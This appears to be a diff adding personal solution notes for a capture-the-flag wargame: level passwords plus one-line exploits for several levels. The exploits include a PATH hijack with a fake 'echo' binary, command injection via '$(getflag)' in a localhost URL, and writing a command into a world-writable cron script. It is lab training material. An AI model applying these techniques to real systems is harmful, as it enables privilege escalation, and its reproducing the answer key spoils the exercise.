@@ -1,0 +1,11 @@
+level02 = f2av5il02puano7naaf6adaaf
+level03 = kooda2puivaav1idi4f57q8iq
+	vim /tmp/echo
+		/bin/getflag
+	chmod +x /tmp/echo
+	PATH=/tmp:$PATH ./level03
+level04 = qi0maab88jeaj46qoumi7maus
+	curl 'localhost:4747?x=$(getflag)'
+level05 = ne2searoevaevoem4ov4ar8ap
+	echo "getflag > /tmp/flagg" > /opt/openarenaserver/script.sh
+level06 = viuaaale9huek52boumoomioc
